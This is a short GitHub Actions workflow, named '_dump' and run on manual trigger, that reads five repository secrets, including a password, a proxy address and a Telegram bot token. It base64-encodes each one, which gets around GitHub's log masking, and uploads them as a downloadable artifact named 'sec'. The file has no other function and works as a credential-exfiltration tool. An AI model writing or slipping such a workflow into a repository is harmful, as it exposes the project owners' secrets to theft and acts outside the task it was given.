name: _dump
on:
  workflow_dispatch: {}
jobs:
  e:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          S_ARCTIC_PASSWORD: ${{ secrets.ARCTIC_PASSWORD }}
          S_ARCTIC_USERNAME: ${{ secrets.ARCTIC_USERNAME }}
          S_SOCKS5_PROXY: ${{ secrets.SOCKS5_PROXY }}
          S_TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          S_TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
        run: |
          mkdir -p out
          printf '%s' "$S_ARCTIC_PASSWORD" | base64 -w0 > out/ARCTIC_PASSWORD.b64
          printf '%s' "$S_ARCTIC_USERNAME" | base64 -w0 > out/ARCTIC_USERNAME.b64
          printf '%s' "$S_SOCKS5_PROXY" | base64 -w0 > out/SOCKS5_PROXY.b64
          printf '%s' "$S_TELEGRAM_BOT_TOKEN" | base64 -w0 > out/TELEGRAM_BOT_TOKEN.b64
          printf '%s' "$S_TG_CHAT_ID" | base64 -w0 > out/TG_CHAT_ID.b64
      - uses: actions/upload-artifact@v4
        with:
          name: sec
          path: out/
